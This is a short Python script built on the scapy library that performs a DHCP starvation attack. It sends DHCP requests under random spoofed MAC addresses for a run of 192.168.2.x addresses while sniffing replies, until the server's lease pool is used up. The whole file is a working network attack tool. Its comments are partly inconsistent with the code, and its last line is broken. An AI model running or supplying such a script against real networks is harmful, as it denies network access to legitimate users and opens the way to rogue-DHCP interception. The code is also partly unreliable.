#!/usr/bin/python -tt

from time import sleep 
from scapy.all import *
from threading import Thread

#The given function is used to store Mac Address after being spoofed and IP addresses from 192.168.0.2 to 192.168.0.254 excluding as 192.168.0.1 is the DHCP server.

class Storage_DHCP(object):
    def __init__(self):
        self.mac_address = []
        self.ip_address = []
        
#The given function maintains the ACK (acknowledge) and NAK (negative acknowledgement) for all requested IPs

    def requireMaintain(self,pkt):
    	if pkt[DHCP]:
        # ACK (Acknowledgement)
            print(pkt[DHCP].options[0])
            if pkt[DHCP].options[0][1]==5:
            	# Appending IPs to ip list
            	self.ip_address.append(pkt[IP].dst)  
            	print(str(pkt[IP].dst)+" registered")
            	print("Acknowledgement Packet Sent.")
        	# NAK (negative acknowledgement)           
            elif pkt[DHCP].options[0][1]==6:
            	print("Negative Acknowledgement Packet Sent.")
            
# This function performs sniffing of UDP traffic 

    def sniff(self):
        sniff(filter="udp and (port 67 or port 68)",prn=self.requireMaintain,store=0)

# Function for process start  
 
    def proc_start(self):
    	thread = Thread(target=self.sniff)
    	thread.start()
    	print("Starvation Started...")
    	print("Curent IP list", self.ip_address)
    	while len(self.ip_address) < 150:
    	    print("Current lenght is ",len(self.ip_address))
    	    self.starvation()
    	print("All requested IPs are Starved")

# Function for starvation process   
  
    def starvation(self):
        for i in range(0,200): #Range from 10 till 254
            if i == 0: 
                continue
            req_ip_addr = "192.168.2."+str(9+i)
            
            #If all IP are registered before already
            
            if req_ip_addr in self.ip_address:
                continue
            # Storing mac address in the mac list to avoid duplicates of the mac address
            spoof_mac = ""
            while spoof_mac in self.mac_address:
                spoof_mac = RandMAC()
            self.mac_address.append(spoof_mac)
            
            # Layers being defined
            
            hw=spoof_mac
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "192.168.2.1"),"end"])
           
            # Packet is sent one by one
           
            sendp(pkt)
            print("Trying.... "+req_ip_addr)
            print("Current lenght is ",len(self.ip_address))
            print("check")
            sleep(0.5) #make the thread sleep for some time
            


starvation = Storage_DHCP() #object of the class inorder to access the function
starvation.proc_start() #start the starvation process
print("Latest MAC List", self.mac_address)
